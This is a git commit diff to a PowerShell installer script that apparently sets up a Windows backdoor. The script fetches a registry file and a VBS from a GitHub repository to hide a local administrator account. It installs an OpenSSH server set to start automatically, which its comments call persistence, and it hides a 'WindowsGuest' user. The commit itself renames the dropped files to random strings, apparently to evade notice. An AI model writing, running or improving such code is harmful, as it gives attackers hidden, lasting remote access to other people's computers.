ccd9961f07d91ccafc83bf068ab7ba29eebe77bf
gozen-foto <gofoto.zen@proton.me>
2026-04-20 15:06:01 +0530

    Update installer.ps1
    Updated variable names for registry and script files to use random strings.

--- installer.ps1
+++ installer.ps1
@@ -56,10 +56,12 @@ mkdir $path
 cd $path
 
 # registry to hide local admin
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "Registry.reg"
+$reg_file = random_text
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "$reg_file.reg"
 
 # visual basic script to register the registry
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "confirm.vbs"
+$con_file = random_text
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "$con_file.vbs"
 
 #enabling persistence ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -67,7 +69,7 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 
 # install the registry
-./"Registry.reg"; ./"confirm.vbs"
+./"$reg_file.reg"; ./"$con_file.vbs"
 
 # hide WindowsGuest user
 cd C:\Users
